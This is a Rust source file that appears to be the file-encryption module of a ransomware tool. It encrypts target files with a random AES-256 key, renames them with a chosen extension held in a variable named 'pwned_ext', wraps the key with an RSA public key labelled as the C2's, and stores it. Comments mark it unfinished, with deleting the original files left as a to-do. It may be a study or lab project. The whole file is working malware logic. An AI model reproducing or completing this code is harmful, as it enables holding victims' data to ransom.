use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use rand::Rng;
use rsa::{RsaPrivateKey, RsaPublicKey};
use pkcs1::{DecodeRsaPublicKey};
use openssl::symm::{self};
use crate::utils::logger::Logger;

/// Encrypts files using randomomly generated AES key
pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str) -> Result<(), Box<dyn std::error::Error>> {
    let files = get_files(&targets)?;

    let (aes_key, aes_iv) = generate_aes()?;
    let public_key = load_public_key()?;
    
    // Encrypt files
    let mut count = 0;
    for file in &files {
        logger.log(&format!("Encrypting {}", file.display().to_string()));
        match encrypt_file(file, aes_key, aes_iv, &extension) {
            Ok(_) => count+=1,
            Err(_) => logger.log_error(&format!("Failed to encrypt: {}", file.display().to_string())),
        }
        
    }

    // Unencrypted symmetric key, TODO: remove after testing
    let aes_initial_path = Path::new("files/aes.key");
    let mut f = File::create(aes_initial_path)?;
    f.write_all(&aes_key)?;

    // Encrypt symmetric key with RSA
    let encrypted_key = encrypt_key(aes_key, &public_key)?;
    logger.log(&format!("Encryption complete: {}/{}", count, files.len()));


    // Save the encrypted key to file
    let encrypted_key_path = Path::new("files/encrypted_key.bin");
    let mut file = File::create(encrypted_key_path)?;
    file.write_all(&encrypted_key)?;
    
    Ok(())
}

/// Get target in correct format
fn get_files(targets: &Vec<String>) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    let mut files = Vec::new();

    for file in targets {
        let file_path = Path::new(file);
        if file_path.exists() {
            // println!("File {} exists", file_path.display().to_string());
            files.push(file_path.to_path_buf());
        } else {
            eprintln!("File {} does not exist", file);
        }
    }

    Ok(files)
}

/// Randomly generates AES key and IV
fn generate_aes() -> Result<([u8; 32], [u8; 16]), Box<dyn std::error::Error>> {
    let mut rng = rand::thread_rng();
    let aes_key: [u8; 32] = rng.r#gen();
    let aes_iv: [u8; 16] = rng.r#gen();

    Ok((aes_key, aes_iv))
}

/// Randomly generates public/private key
fn _generate_rsa() -> Result<(RsaPublicKey,RsaPrivateKey), Box<dyn std::error::Error>> {
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng,bits)?;
    let public_key = RsaPublicKey::from(&private_key);

    Ok((public_key, private_key))
}

/// Encrypts a file using AES, FIX: should delete file after encrypting
fn encrypt_file(path: &PathBuf, key: [u8; 32], iv: [u8; 16], extension: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Open the input file for reading in buffered mode
    let input_file = File::open(path)?;
    let mut reader = io::BufReader::new(input_file);

    // Create a new file path with the `.enc` extension
    let pwned_ext = path
            .extension()
            .and_then(|ext| ext.to_str())
            .map(|ext| format!("{ext}.{extension}"))
            .unwrap_or_else(|| String::from(extension));

    let encrypted_path = path.with_extension(pwned_ext); 

    // Open the output file for writing in buffered mode
    let output_file = File::create(&encrypted_path)?;
    let mut writer = io::BufWriter::new(output_file);

    // Initialize the AES-256-CTR Crypter
    let cipher = symm::Cipher::aes_256_ctr();
    let mut crypter = symm::Crypter::new(cipher, symm::Mode::Encrypt, &key, Some(&iv))?;
    let mut buffer = [0u8; 4096]; // 4KB buffer
    let mut encrypted_buffer = vec![0u8; 4096 + cipher.block_size()]; // Extra space for encryption overhead

    // Prepend IV (first 16 bytes) to the encrypted file
    writer.write_all(&iv)?;

    // Encrypt each chunk and write to output_file
    loop {
        let bytes_read = reader.read(&mut buffer)?;
        if bytes_read == 0 { break; }

        let count = crypter.update(&buffer[..bytes_read], &mut encrypted_buffer)?;

        //let encrypted_data = symm::encrypt(cipher, &key, Some(iv.as_slice()), &buffer[..bytes_read])?;

        writer.write_all(&encrypted_buffer[..count])?;
    }

    // Finalize encryption (not strictly necessary for CTR, but good practice)
    let count = crypter.finalize(&mut encrypted_buffer)?;
    writer.write_all(&encrypted_buffer[..count])?;

    //Delete old file
    // fs::remove_file(&path)?;

    Ok(())
}

/// Encrypts AES key using public key
fn encrypt_key(aes_key: [u8; 32], rsa_key: &RsaPublicKey) -> Result<Vec<u8>,Box<dyn std::error::Error>> {
    let mut rng = rand::rngs::OsRng;

    let encrypted_key = rsa_key.encrypt(&mut rng, rsa::Pkcs1v15Encrypt, &aes_key)?;
    Ok(encrypted_key)
}

/// Load public key of C2
fn load_public_key() -> Result<RsaPublicKey, Box<dyn std::error::Error>> {
    let path = "c2_rsa_key.pub";
    let mut reader = fs::File::open(path)?;
    let mut key = String::new();
    reader.read_to_string(&mut key)?;

    let rsa_key = RsaPublicKey::from_pkcs1_pem(&key)?;

    Ok(rsa_key)
}

